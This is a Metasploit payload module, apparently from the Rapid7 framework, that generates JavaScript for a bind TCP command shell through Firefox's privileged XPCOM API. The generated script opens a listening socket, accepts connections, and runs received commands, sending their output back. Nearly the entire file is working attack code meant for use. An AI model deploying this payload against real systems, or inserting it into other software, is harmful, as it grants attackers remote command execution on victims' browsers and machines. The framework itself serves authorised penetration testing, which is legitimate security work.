##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = :dynamic

  include Msf::Payload::Single
  include Msf::Payload::Firefox
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Command Shell, Bind TCP (via Firefox XPCOM script)',
      'Description'   => %q{Creates an interactive shell via Javascript with access to Firefox's XPCOM API},
      'Author'        => ['joev'],
      'License'       => BSD_LICENSE,
      'Platform'      => 'firefox',
      'Arch'          => ARCH_FIREFOX,
      'Handler'       => Msf::Handler::BindTcp,
      'Session'       => Msf::Sessions::CommandShell,
      'PayloadType'   => 'firefox'
    ))
  end

  #
  # Returns the JS string to use for execution
  #
  def generate
    %Q|
    (function(){
      window = this;
      Components.utils.import("resource://gre/modules/NetUtil.jsm");
      var lport = #{datastore["LPORT"]};
      var rhost = "#{datastore['RHOST']}";
      var serverSocket = Components.classes["@mozilla.org/network/server-socket;1"]
                             .createInstance(Components.interfaces.nsIServerSocket);
      serverSocket.init(lport, false, -1);

      var listener = {
        onSocketAccepted: function(serverSocket, clientSocket) {
          var outStream = clientSocket.openOutputStream(0, 0, 0);
          var inStream = clientSocket.openInputStream(0, 0, 0);
          var pump = Components.classes["@mozilla.org/network/input-stream-pump;1"]
                     .createInstance(Components.interfaces.nsIInputStreamPump);
          pump.init(inStream, -1, -1, 0, 0, true);
          pump.asyncRead(clientListener(outStream), null);
        }
      };

      #{read_until_token_source}

      var clientListener = function(outStream) {
        return {
          onStartRequest: function(request, context) {},
          onStopRequest: function(request, context) {},
          onDataAvailable: readUntilToken(function(data) {
            runCmd(data, function(err, output) {
              if(!err) outStream.write(output, output.length);
            });
          })
        };
      };

      #{run_cmd_source}

      serverSocket.asyncListen(listener);
    })();
    |
  end
end
